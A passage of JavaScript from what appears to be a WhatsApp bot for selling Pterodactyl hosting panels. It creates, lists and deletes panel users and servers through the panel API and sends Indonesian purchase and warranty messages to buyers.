* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: tekspanel}, {quoted: null})
await danz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.mess.key })
delete db.users[m.sender].saweria
}
}

}
break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await danz.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.mess})
await danz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.mess.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
> Pesanan anda telah sampai
© DanzBotz V2 - Update 2025
       ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
*​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

case "listadmin-V3": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

case "listadmin-V4": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

case "listadmin-V5": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break


//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await danz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "listpanel-v3": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await danz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "listpanel-v4": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV4 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV4 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV4
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await danz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "listpanel-v5": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV5 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV5 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV5
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await danz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "deladmin-V3": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV3 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "deladmin-V4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV4 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "deladmin-V5": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV5 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
> Pesanan anda telah sampai
© DanzBotz V2 - Update 2025
